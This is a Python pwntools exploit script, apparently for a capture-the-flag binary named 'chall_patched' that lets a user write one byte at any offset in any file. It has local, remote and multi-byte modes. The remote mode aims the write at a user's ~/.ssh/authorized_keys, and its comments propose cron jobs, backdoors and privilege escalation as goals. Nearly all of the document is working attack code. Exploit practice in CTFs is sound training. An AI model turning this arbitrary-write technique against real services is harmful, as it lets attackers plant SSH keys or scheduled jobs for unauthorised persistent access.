#!/usr/bin/env python3
"""
Exploit for the arbitrary write vulnerability in chall_patched

The binary allows writing a single byte to any offset in any file.
This is an arbitrary write primitive that can be used to:
1. Overwrite critical files
2. Modify configuration files
3. Create backdoors
4. Escalate privileges

For this challenge, the typical approach is to:
- Write shellcode or backdoor to a writable location
- Modify execution flow to run the backdoor
"""

from pwn import *
import sys
import os

# Configuration
BINARY = './chall_patched'
CONTEXT = 'amd64'

# Setup pwntools context
context.arch = CONTEXT
context.log_level = 'info'

def exploit_local():
    """
    Local exploitation - demonstrates the arbitrary write vulnerability
    """
    # Start the process
    p = process(BINARY)
    
    # Example: Write to a test file
    # In a real scenario, you would target a critical file
    
    # Step 1: Provide filename
    p.recvuntil(b'Enter filename:')
    filename = b'/tmp/exploit_test.txt'
    p.sendline(filename)
    
    # Step 2: Provide offset
    p.recvuntil(b'Enter offset:')
    offset = b'0'
    p.sendline(offset)
    
    # Step 3: Provide data (single byte)
    p.recvuntil(b'Enter data:')
    data = b'A'
    p.send(data)
    
    # Receive the completion message
    result = p.recvall()
    print(result.decode())
    
    p.close()
    
    # Verify the write
    if os.path.exists('/tmp/exploit_test.txt'):
        with open('/tmp/exploit_test.txt', 'rb') as f:
            content = f.read()
            print(f"[+] Successfully wrote to file: {content}")
    
    return True

def exploit_remote(host, port):
    """
    Remote exploitation - connect to remote service
    """
    p = remote(host, port)
    
    # Step 1: Provide filename
    p.recvuntil(b'Enter filename:')
    # For remote exploitation, target files that will give you access
    # Examples: ~/.ssh/authorized_keys, cron jobs, etc.
    filename = b'/home/ctf/.ssh/authorized_keys'
    p.sendline(filename)
    
    # Step 2: Provide offset
    p.recvuntil(b'Enter offset:')
    offset = b'0'
    p.sendline(offset)
    
    # Step 3: Provide data
    p.recvuntil(b'Enter data:')
    # This would be part of your SSH public key or backdoor
    data = b's'
    p.send(data)
    
    result = p.recvall()
    print(result.decode())
    
    p.close()
    
    return True

def create_test_file():
    """
    Create a test file for local exploitation
    """
    test_file = '/tmp/exploit_test.txt'
    with open(test_file, 'w') as f:
        f.write('Original content')
    os.chmod(test_file, 0o666)
    print(f"[+] Created test file: {test_file}")

def advanced_exploit():
    """
    Advanced exploitation technique:
    - Write multiple bytes by calling the binary multiple times
    - Build a complete payload byte-by-byte
    """
    target_file = '/tmp/advanced_exploit.txt'
    payload = b'EXPLOITED!'
    
    # Create target file
    with open(target_file, 'wb') as f:
        f.write(b'\x00' * len(payload))
    os.chmod(target_file, 0o666)
    
    print(f"[*] Writing payload to {target_file}")
    
    # Write each byte of the payload
    for i, byte in enumerate(payload):
        p = process(BINARY)
        
        # Provide filename
        p.recvuntil(b'Enter filename:')
        p.sendline(target_file.encode())
        
        # Provide offset
        p.recvuntil(b'Enter offset:')
        p.sendline(str(i).encode())
        
        # Provide data
        p.recvuntil(b'Enter data:')
        p.send(bytes([byte]))
        
        p.recvall()
        p.close()
    
    # Verify the result
    with open(target_file, 'rb') as f:
        result = f.read()
        print(f"[+] Final content: {result}")
        if result == payload:
            print("[+] Exploit successful!")
            return True
    
    return False

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} local     - Test local exploitation")
        print(f"  {sys.argv[0]} remote <host> <port> - Exploit remote service")
        print(f"  {sys.argv[0]} advanced  - Demonstrate advanced multi-byte write")
        sys.exit(1)
    
    mode = sys.argv[1]
    
    if mode == 'local':
        create_test_file()
        exploit_local()
    elif mode == 'remote':
        if len(sys.argv) < 4:
            print("Error: remote mode requires host and port")
            sys.exit(1)
        host = sys.argv[2]
        port = int(sys.argv[3])
        exploit_remote(host, port)
    elif mode == 'advanced':
        advanced_exploit()
    else:
        print(f"Unknown mode: {mode}")
        sys.exit(1)

if __name__ == '__main__':
    main()
